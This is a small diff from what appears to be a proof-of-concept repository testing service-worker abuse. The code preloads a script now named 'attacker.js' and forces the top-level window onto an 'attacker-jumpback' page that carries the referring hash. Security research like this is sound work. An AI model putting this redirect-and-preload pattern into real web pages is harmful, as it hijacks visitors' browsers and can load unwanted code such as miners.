@@ -25,7 +25,7 @@ function setupSw() {
   }
   var refer = location.hash.substr(1);
   var url = 'https://boyangwang.github.com/test-sw-mining/attacker-jumpback.html?back_url=' + encodeURI(refer);
-  var reslist = [url, 'sw.js'];
+  var reslist = [url, 'attacker.js'];
   preload(reslist, function() {
     top.location = url;
   });
